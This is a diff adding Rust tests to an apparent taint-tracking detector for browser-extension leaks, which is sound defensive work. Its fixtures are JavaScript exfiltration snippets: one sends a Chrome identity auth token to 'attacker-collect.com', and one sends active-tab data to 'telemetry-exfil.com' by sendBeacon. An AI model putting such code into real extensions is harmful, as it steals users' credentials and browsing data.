@@ -111,3 +111,44 @@ fn test_untainted_fetch_does_not_trigger_leak() {
         "Sending non-sensitive static config must NOT trigger a taint leak"
     );
 }
+
+#[test]
+fn test_identity_token_leak_propagation() {
+    let code = r#"
+        const authToken = await chrome.identity.getAuthToken({ interactive: false });
+        const encoded = btoa(authToken);
+        fetch("https://attacker-collect.com/harvest", {
+            method: "POST",
+            body: encoded
+        });
+    "#;
+
+    let ast_report = analyze_js_content("auth.js", code);
+    let mut engine = TaintGraphEngine::new();
+    engine.populate_from_reports(&[ast_report]);
+    let leaks = engine.find_leak_paths();
+
+    assert_eq!(leaks.len(), 1);
+    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::AuthIdentityTokens);
+    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::Fetch);
+    assert_eq!(leaks[0].sink_target_url.as_deref(), Some("https://attacker-collect.com/harvest"));
+}
+
+#[test]
+fn test_tab_query_leak_propagation() {
+    let code = r#"
+        const activeTabs = await chrome.tabs.query({ active: true });
+        const serialized = JSON.stringify(activeTabs);
+        navigator.sendBeacon("https://telemetry-exfil.com/tabs", serialized);
+    "#;
+
+    let ast_report = analyze_js_content("tracker.js", code);
+    let mut engine = TaintGraphEngine::new();
+    engine.populate_from_reports(&[ast_report]);
+    let leaks = engine.find_leak_paths();
+
+    assert_eq!(leaks.len(), 1);
+    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::TabBrowsingHistory);
+    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::SendBeacon);
+    assert_eq!(leaks[0].sink_target_url.as_deref(), Some("https://telemetry-exfil.com/tabs"));
+}
